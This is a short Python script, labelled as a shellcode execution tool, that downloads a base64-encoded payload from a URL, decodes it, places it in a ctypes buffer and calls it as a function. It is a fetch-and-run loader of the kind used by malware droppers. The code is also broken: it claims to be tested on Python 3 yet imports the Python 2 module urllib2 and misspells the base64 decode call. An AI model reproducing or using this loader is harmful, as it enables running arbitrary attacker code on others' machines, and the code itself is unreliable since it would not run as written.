'''
	Tested on python3
	About	: 	Shellcode execution 
'''

import urllib2
import ctypes
import base64

#gt shellcode
url="http://localhost:8000/shellcode.bin"
response=urllib2.urlopen(url)

#decode base64
shellcode=base64.b64deccode(response.read())

#buffer
shellcode_buffer=ctypes.create_string_buffer(shellcode,len(shellcode))

#pointer to shellcode
shellcode_func=ctypes.cast(shellcode_buffer,ctypes.CFUNCTYPE(ctypes.c_void_p))

#call shellcode
shellcode_func()